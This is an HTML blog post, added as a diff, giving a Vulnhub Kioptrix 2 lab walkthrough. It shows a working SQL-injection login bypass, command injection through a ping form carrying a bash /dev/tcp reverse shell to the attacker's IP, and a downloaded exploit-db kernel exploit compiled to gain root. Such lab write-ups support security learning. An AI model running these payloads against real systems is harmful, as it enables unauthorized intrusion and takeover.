@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="https://hussein-elsayed.github.io/2020/kioptrix1/" />
+  <link rel="next" href="https://hussein-elsayed.github.io/2021/hello/" />
+  <link rel="canonical" href="https://hussein-elsayed.github.io/2020/kioptrix2/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Kioptrix 2 Writeup | Wh1rlw1nd
+       
+  </title>
+  <meta name="title" content="Kioptrix 2 Writeup | Wh1rlw1nd">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Kioptrix 2 Writeup"/>
+<meta name="twitter:description" content="Download kioptrix 2 VM here
+Services:
+ Apache MySQL Openssh RPC CUPS  0. Getting machine&rsquo;s ip: Also # netdiscover -r 192.168.1.0/24 works fine.
+1. Enumeration:  Zenmap:   So first things first, let&rsquo;s check the web server running ..
+2. Web Server:  Hitting vm&rsquo;s ip 192.168.1.7 shows us this login form:   it&rsquo;s an admin login , maybe it&rsquo;s vulnerable to sql injection let&rsquo;s try to bypass it ."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Kioptrix 2 Writeup",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/hussein-elsayed.github.io\/2020\/kioptrix2\/"
+  },
+  "image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/hussein-elsayed.github.io\/cover.png",
+    "width":  800 ,
+    "height":  600 
+  },
+  "genre": "posts",
+  "keywords": "Writeups, Vulnhub",
+  "wordcount":  499 ,
+  "url": "https:\/\/hussein-elsayed.github.io\/2020\/kioptrix2\/",
+  "datePublished": "2020-04-11T10:50:53\u002b02:00",
+  "dateModified": "2020-04-11T10:50:53\u002b02:00",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "Wh1rlw1nd",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https:\/\/hussein-elsayed.github.io\/logo.png",
+      "width":  127 ,
+      "height":  40 
+    }
+  },
+  "author": {
+    "@type": "Person",
+    "name": "Wh1rlw1nd"
+  },
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">Kioptrix 2 Writeup</h1>
+        <div class="post-meta">
+            Written by <a href="https://hussein-elsayed.github.io/" rel="author">Wh1rlw1nd</a> with ♥ 
+                <span class="post-time">
+                    on <time datetime=2020-04-11 >11 April 2020</time>
+                </span>
+                in
+                
+                <i class="iconfont icon-timer"></i>
+                3 min
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>Download kioptrix 2 VM <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">here</a></p>
+<p>Services:</p>
+<ul>
+<li>Apache</li>
+<li>MySQL</li>
+<li>Openssh</li>
+<li>RPC</li>
+<li>CUPS</li>
+</ul>
+<h3 id="0-getting-machines-ip">0. Getting machine&rsquo;s ip:</h3>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/1.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>Also <code># netdiscover -r 192.168.1.0/24</code> works fine.</p>
+<h3 id="1-enumeration">1. Enumeration:</h3>
+<ul>
+<li>Zenmap:
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/2.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
+</ul>
+<p>So first things first, let&rsquo;s check the web server running ..</p>
+<h3 id="2-web-server">2. Web Server:</h3>
+<ul>
+<li>Hitting vm&rsquo;s ip 192.168.1.7 shows us this login form:
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/3.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/4.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
+</ul>
+<p>it&rsquo;s an admin login , maybe it&rsquo;s vulnerable to sql injection let&rsquo;s try to bypass it ..</p>
+<ul>
+<li>note: i also made directory enumeration but found nothing useful ..</li>
+</ul>
+<p>Trying with this payload:</p>
+<ul>
+<li>admin&quot; or 1=1 #</li>
+</ul>
+<p>For other payloads too <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">here</a>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/5.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+And boom it worked fine, and we&rsquo;re in as web admin ..
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/6.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>Why this happened? Maybe the form query is:</p>
+<p><code>SELECT * from users where username=&quot;$_REQUEST[&quot;username&quot;]&quot; and password=&quot;$_REQUEST[&quot;password&quot;]&quot;</code></p>
+<p>And using the payload evaluated it to:</p>
+<p><code>SELECT * from users where username=&quot;admin&quot; or 1=1 # //ignored the rest of code</code></p>
+<h3 id="3-admin-panel">3. Admin panel:</h3>
+<ul>
+<li>it pings machines let&rsquo;s try 127.0.0.1 and see what happens:
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/7.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+we got this response:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">127.0.0.1 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.026 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.051 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.026/0.039/0.051/0.011 ms, pipe 2
+</code></pre></div><ul>
+<li>So what if we could apply our own commands in this bash as RCE(Remote code execution):
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+And it worked and <code>whoami</code>command gave us output: apache!</li>
+</ul>
+<h3 id="4-exploitation">4. Exploitation:</h3>
+<ul>
+<li>let&rsquo;s try to make reverse shell!</li>
+</ul>
+<p>note: you can get reverse shell payloads in lots of languages <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">here</a></p>
+<p>What  i used :</p>
+<ul>
+<li>bash -i &gt;&amp; /dev/tcp/ATTACKER&rsquo;s-IP/PORT 0&gt;&amp;1</li>
+</ul>
+<p><code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/192.168.1.6/1337 0&gt;&amp;1</code></p>
+<p>Netcat listener on our host:</p>
+<ul>
+<li>
+<p>start nc first before the sending the reverse shell command.</p>
+<ul>
+<li><code>nc -nlvp 1337</code></li>
+</ul>
+</li>
+</ul>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/9.png" alt="we got shell as apache.. Awesome!!" class="lazyload"><figcaption class="image-caption">we got shell as apache.. Awesome!!</figcaption></figure></p>
+<h3 id="5-privilege-escalation">5. Privilege Escalation:</h3>
+<ul>
+<li>we want to get root from this apache user..
+<ul>
+<li>let&rsquo;s get some information about this system:</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-3.00$ uname -a
+Linux kioptrix.level2 2.6.9-55.EL <span style="color:#75715e">#1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span>
+bash-3.00$ uname -mrs
+Linux 2.6.9-55.EL i686
+bash-3.00$ cat /etc/redhat-release
+CentOS release 4.5 <span style="color:#f92672">(</span>Final<span style="color:#f92672">)</span>
+</code></pre></div><ul>
+<li>searching for exploits for this release, found this:
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/9542">https://www.exploit-db.com/exploits/9542</a></li>
+</ul>
+</li>
+</ul>
+<p>let&rsquo;s download it to the machine and run it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">bash-3.00$ cd /tmp</span>
+<span style="color:#ae81ff">bash-3.00$ wget https://www.exploit-db.com/exploits/9542</span>
+--<span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">57</span>:<span style="color:#ae81ff">56</span>--  <span style="color:#ae81ff">https://www.exploit-db.com/exploits/9542</span>
+           <span style="color:#ae81ff">=&gt; `9542&#39;</span>
+<span style="color:#ae81ff">Resolving www.exploit-db.com... 192.124.249.8</span>
+<span style="color:#ae81ff">Connecting to www.exploit-db.com|192.124.249.8|:443... connected.</span>
+<span style="color:#f92672">OpenSSL</span>: <span style="color:#ae81ff">error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version</span>
+<span style="color:#ae81ff">Unable to establish SSL connection.</span>
+<span style="color:#ae81ff">bash-3.00$ wget https://www.exploit-db.com/download/9542 --no-check-certificate</span>
+--<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">02</span>--  <span style="color:#ae81ff">https://www.exploit-db.com/download/9542</span>
+           <span style="color:#ae81ff">=&gt; `9542&#39;</span>
+<span style="color:#ae81ff">Resolving www.exploit-db.com... 192.124.249.8</span>
+<span style="color:#ae81ff">Connecting to www.exploit-db.com|192.124.249.8|:443... connected.</span>
+<span style="color:#f92672">OpenSSL</span>: <span style="color:#ae81ff">error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version</span>
+<span style="color:#75715e">**Unable</span> <span style="color:#ae81ff">to establish SSL connection.**</span>
+</code></pre></div><p>I tried a lot but couldn&rsquo;t download it directly on the machine, so i downloaded it on my host and put it on localhost server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">mv 9542<span style="color:#f92672">.</span><span style="color:#a6e22e">c</span> <span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html
+sudo systemctl start apache2 <span style="color:#f92672">&gt;&gt;</span> to start apache server
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/10.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix2/11.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<h3 id="finishing-and-getting-root">Finishing and getting root:</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">bash-3.00$ wget 192.168.1.6/9542.c</span>
+--<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">39</span>:<span style="color:#ae81ff">04</span>--  <span style="color:#ae81ff">http://192.168.1.6/9542.c</span>
+           <span style="color:#ae81ff">=&gt; `9542.c&#39;</span>
+<span style="color:#ae81ff">bash-3.00$ gcc 9542.c </span>
+<span style="color:#ae81ff">bash-3.00$ ls</span>
+<span style="color:#ae81ff">9542.</span><span style="color:#ae81ff">c</span>
+<span style="color:#ae81ff">a.out</span>
+<span style="color:#ae81ff">bash-3.00$ ./a.out</span>
+<span style="color:#f92672">sh</span>: <span style="color:#66d9ef">no</span> <span style="color:#ae81ff">job control in this shell</span>
+<span style="color:#ae81ff">sh-3.00# whoami</span>
+<span style="color:#ae81ff">root</span>
+
+</code></pre></div><p>Awesome we got root access :D &hellip;</p>
+<p>note: i roamed the system there is nothing usefull or flag or anything :)</p>
+<p>hope you enjoyed&hellip;</p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Wh1rlw1nd </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words:</span>
+                   <span>499</span>
+            </p>
+            
+            <p class="copyright-item">
+                
+                <span>Share:</span>
+                <span>
+
+      
+        <a href="//twitter.com/share?url=https%3a%2f%2fhussein-elsayed.github.io%2f2020%2fkioptrix2%2f&amp;text=Kioptrix%202%20Writeup&amp;via=Wh1r1w1nd" target="_blank" title="Share on Twitter">
+          <i class="iconfont icon-twitter"></i>
+        </a>
+        
+      
+      
+        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fhussein-elsayed.github.io%2f2020%2fkioptrix2%2f" target="_blank" title="Share on Facebook">
+          <i class="iconfont icon-facebook"></i>
+        </a>
+        
+      
+      
+      
+      
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fhussein-elsayed.github.io%2f2020%2fkioptrix2%2f&amp;title=Kioptrix%202%20Writeup" target="_blank" title="Share on LinkedIn">
+          <i class="iconfont icon-linkedin"></i>
+        </a>
+        
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+                
+            </p>
+
+             
+            <p class="copyright-item">
+                Released under <a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a>
+            </p>
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-icon-tag"></i>Tag: 
+            
+            <span class="tag"><a href="https://hussein-elsayed.github.io/tags/writeups/">
+                    #Writeups</a></span>
+            
+            <span class="tag"><a href="https://hussein-elsayed.github.io/tags/vulnhub/">
+                    #Vulnhub</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="https://hussein-elsayed.github.io/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://hussein-elsayed.github.io/2020/kioptrix1/" class="prev" rel="prev" title="Kioptrix Level 1 Writeup"><i class="iconfont icon-dajiantou"></i>&nbsp;Kioptrix Level 1 Writeup</a>
+         
+        
+        <a href="https://hussein-elsayed.github.io/2021/hello/" class="next" rel="next" title="Hello world!">Hello world!&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+          <div id="disqus_thread"></div>
+  <script type="text/javascript">
+      (function() {
+          
+          
+          if (window.location.hostname == "localhost")
+              return;
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          var disqus_shortname = 'disqus_NIRv8ve7PS';
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2020 - 2021</span>
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a> | </span>
+         
+
+		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    <link crossorigin="anonymous" integrity="sha384-yziQACfvCVwLqVFLqkWBYRO3XeA4EqzfXKGwaWnenYn5XzqfJFlFdKEmvutIQdKb" href="https://lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
